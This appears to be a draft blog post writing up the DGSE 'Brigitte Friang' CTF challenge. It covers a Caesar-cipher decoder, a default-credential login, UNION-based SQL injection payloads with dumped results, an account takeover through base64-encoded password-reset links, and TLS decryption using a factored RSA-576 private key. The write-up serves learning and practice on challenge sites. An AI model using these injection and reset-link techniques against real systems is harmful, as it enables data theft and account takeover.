---
title: "Write-up of the DGSE's challenge : Brigitte Friang"
date: 2020-06-09T20:34:00+02:00
draft: true
tags: ["blog","security","ctf"]
type: "posts"
showDate: true
---

## Introduction

This was my first CTF. After beginning to learn security in september, I'm really proud 
 of what I managed to achieve : finishing 57/753, completing half of the challenges.

I did learn that cryptography really is one of my weak points.

TODO : sommaire

## The beginning

![Challenge page](/assets/brigitte-friang/start.png)

Opening the website, I was greeted with this page. In the source code, there was :

```html
				<link rel="stylesheet" href="/static/css/style.css">
        <!--/static/message-secret.html-->
    </head>
```

Heading to that page reveals a coded message. We quickly find that the text is encoded using a ceasar cipher, with a shift of 19. A simple script allowed me to decrypt it :

```python
import string


with open('source.txt', 'r') as f:
    contents = f.read()

out = ''
shift = 19

for char in contents:
    if not char.isalpha():
        out += char
        continue

    try:
        alphabet = string.ascii_lowercase if char.islower() else string.ascii_uppercase
        index = alphabet.index(char)
        out += alphabet[(index + shift) % len(alphabet)]
    except:
        out += char

print(out)
```

> Si vous parvenez a lire ce message, c'est que vous pouvez rejoindre l’operation «Brigitte Friang». Rejoignez-nous rapidement.
>
> Brigitte Friang est une resistante, journaliste et ecrivaine francaise. Elle est nee le 23/01/1924 a Paris, elle a 19 ans sous l'occupation lorsqu'elle est recrutee puis formee comme secretaire/chiffreuse par un agent du BCRA, Jean-Francois Clouet des Perruches alias Galilee chef du Bureau des operations aeriennes (BOA) de la Region M (Cote du Nord, Finistere, Indre et Loire, Orne, Sarthe, Loire inferieure, Maine et Loire, Morbihan, Vendee). Brigitte Friang utilise parfois des foulards pour cacher des codes. Completez l’URL avec l’information qui est cachee dans ce message.
>
> Suite a l’arrestation et la trahison de Pierre Manuel, Brigitte Friang est arretee par la Gestapo. Elle est blessee par balle en tentant de s’enfuir et est conduite a l’Hopital de la Pitie. Des resistants tenteront de la liberer mais sans succes. Elle est torturee et ne donnera pas d'informations. N’oubliez pas la barre oblique. Elle est ensuite envoyee dans le camp de Ravensbruck.
>
> Apres son retour de deportation, elle participe a la creation du Rassemblement du peuple français (RPF). Elle integre la petite equipe, autour d'Andre Malraux, qui va preparer le discours fondateur de Strasbourg en 1947 et les elections legislatives de 1951.
> 
> Elle rentre a l'ORTF, et devient correspondante de guerre. Elle obtient son brevet de saut en parachute et accompagne des commandos de parachutistes en operation durant la guerre d’Indochine. Elle raconte son experience dans Les Fleurs du ciel (1955). D'autres agents sont sur le coup au moment ou je vous parle. Les meilleurs d'entre vous se donneront rendez-vous a l'European Cyberweek a Rennes pour une remise de prix. Resolvez le plus d'epreuves avant la fin de cette mission et tentez de gagner votre place parmi l'elite! Par la suite, elle couvre l’expedition de Suez, la guerre des Six Jours et la guerre du Viet Nam. Elle prend position en faveur d'une autonomie du journalisme dans le service public ce qui lui vaut d'etre licenciee de l'ORTF.
>
> Elle ecrit plusieurs livres et temoigne de l'engagement des femmes dans la Resistance.

After inspecting the source code, we find that a few of the letters are in bold : `/joha`. Decoded, this gives us `/chat`.

## Chatting

I was presented with a few challenges. The goal was to finish one of them, to access a classical CTF platform.

I'm only going to talk about the challenge offered by Nitel, which is the one I solved.

![Conversation with Nitel](/assets/brigitte-friang/nitel.png)

Nitel gives us two links, which we are going to visit.

### Stockos

Going to the first URL, we are greeted with a login page. Using `admin`/`admin` logs us in, and we are greeted with a dashboard.

Nitel asked us to find the email of one of the clients. Since nonce of them are displayed on the dashboard, we're going to have to find a vulnerability.

Two forms are present on the website. After entering a single quote in the first one, we get :

> Erreur : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' ORDER BY section ASC' at line 1

Bingo! A simple SQL injection gives us the schema of the database :

```SQL
' union (select table_name, column_name, 3, 4, 5 FROM information_schema.columns) -- -
```

```
customer 	delivery_address 	3 	4 	5
customer 	email 	3 	4 	5
customer 	id 	3 	4 	5
customer 	name 	3 	4 	5
customer 	signup_date 	3 	4 	5
orders 	confidential 	3 	4 	5
orders 	customer 	3 	4 	5
orders 	delivery_date 	3 	4 	5
orders 	id 	3 	4 	5
orders 	item_name 	3 	4 	5
orders 	order_date 	3 	4 	5
orders 	order_status 	3 	4 	5
orders 	section 	3 	4 	5
orders 	supplier 	3 	4 	5
section 	capacity 	3 	4 	5
section 	confidential 	3 	4 	5
section 	id 	3 	4 	5
section 	last_update 	3 	4 	5
section 	name 	3 	4 	5
supplier 	address 	3 	4 	5
supplier 	id 	3 	4 	5
supplier 	name 	3 	4 	5
supplier 	website 	3 	4 	5
```

From there, we can extract all of the emails :

```SQL
' union (select email, 2, 3, 4, 5 from customer) -- -
```

Which are :

```
orders@acme.zz 	2 	3 	4 	5
orders@soylent.zz 	2 	3 	4 	5
orders@initech.zz 	2 	3 	4 	5
orders@kozey.zz 	2 	3 	4 	5
orders@massived.zz 	2 	3 	4 	5
orders@vehement.zz 	2 	3 	4 	5
orders@hooli.zz 	2 	3 	4 	5
orders@bailey.zz 	2 	3 	4 	5
orders@umbrella.zz 	2 	3 	4 	5
orders@smartchems.zz 	2 	3 	4 	5
orders@ecorp.zz 	2 	3 	4 	5
agent.malice@secret.evil.gov.ev 	2 	3 	4 	5
hbdlb@scep.eg 	2 	3 	4 	5
```

One email stands out from the rest : `agent.malice@secret.evil.gov.ev`.

### Evil-Air

The second URL appears to be a plane ticket website. Nitel asked us to reserve a specific ticket, but after creating an account and trying to reverse it, we're hit with an error message : `Vous ne pouvez pas réserver cette destination` or `You can't reserve this destination.`.

So, once again, we're going to have to find a vulnerability. After registering a few accounts, I looked at the format of the validation link :

```
/35e334a1ef338faf064da9eb5f861d3c/activate/YWx0LmNxLTlvb3Zrb2tlQHlvcG1haWwuY29t
```

Hmmm. That last part of the URL suspiciously looks like base64... And it is! Decoding it gives us the email address that I used.

Now the interesting part is that the password reinitialization link uses the same kind of hash. AND it doesn't actually reset the password, it shows us the stored password.

Maybe trying to use the email we got just before would work? After sending a password reset request to `agent.malice@secret.evil.gov.ev`, we can just go to this URL :

[https://challengecybersec.fr/35e334a1ef338faf064da9eb5f861d3c/reset/YWdlbnQubWFsaWNlQHNlY3JldC5ldmlsLmdvdi5ldg==](https://challengecybersec.fr/35e334a1ef338faf064da9eb5f861d3c/reset/YWdlbnQubWFsaWNlQHNlY3JldC5ldmlsLmdvdi5ldg==)

And we get the password. After trying to reserve the ticket, we find out that it's already reserved. The ticket is stored in the user account, so we can access it. A QR Code is associated :

![The ticket](/assets/brigitte-friang/ticket.png)

Decoding it gives us the flag! We can now continue our conversation with Nitel :

![Following our conversation with Nitel](/assets/brigitte-friang/nitel_2.png)

### Pcap analysis

The given pcap contains https encrypted traffic. We need a way to decrypt it..

First, let's [look at the certificate that is used](https://security.stackexchange.com/questions/123851/how-can-i-extract-the-certificate-from-this-pcap-file). We can extract it using wireshark, by right clicking the certificate information and using `Export Packet Bytes` to `cert.der`.

Then, we can use `openssl x509 -inform der -in cert.der -text` to get some information. The intersecting part :

```
...
RSA Public-Key: (576 bit)
...
```

Now RSA 576 has been factorized. In fact, you can find the factors [on wikipedia](https://en.wikipedia.org/wiki/RSA_numbers#RSA-576). I followed this [very good tutorial](https://helperbyte.com/questions/50507/rsa-576bit-how-to-decrypt), which gives ut the private key :

```
-----BEGIN RSA PRIVATE KEY-----
MIIBXwIBAAJJAMLLsk/b+SO2Emjj8Ro4lt5FdLO6WHMMvWUpOIZOIiPu63BKF8/Q
jRa0aJGmFHR1mTnG5Jqv5/JZVUjHTB1/uNJM0VyyO0zQowIDAQABAkgyAw5Cxp1O
d95+I5exPbouUvLFeiBfWXP+1vh2MvU8+IhmCf9j+hFOK13x22JJ+Orwv1+iatW4
5It/qwUNMvxXS0RuItCLp7ECJQDM6VRX8SfElUbleEECmsavcGBMZOgoEBisu1OC
M7tX83puaJUCJQDzXLgl8AM5bxHxSaWaD+c9tDFiyzBbjr/tpcqEC+JMU2tqrlcC
JQCjGt8+GQD0o3YJVc05i4W3RBYC+RcqPJXHeFyieRcYjP/ZPnkCJQDVUULBTl8l
KuzJWcrk/metuJNJi925g6lMwHSBxoD4cm7HtkUCJFqWTOzCIODw7eoypcJYjm2O
/ohEsSjEXsg6Bh8mY3LunBaqiA==
-----END RSA PRIVATE KEY-----
```

We can know decode the traffic using wireshark, by going to Edit -> Preferences -> Protocols -> SSL -> RSA Keys list, and then by adding the key (as a file).

Then, when looking at the decoded traffic, we see this hash : `7a144cdc500b28e80cf760d60aca2ed3`. And it brings us to the next step : the CTF platform!

## The CTF Platform

I finished 7 of the 14 challenges, which is (I think) pretty good. My team name was `Arctic Coffee`.
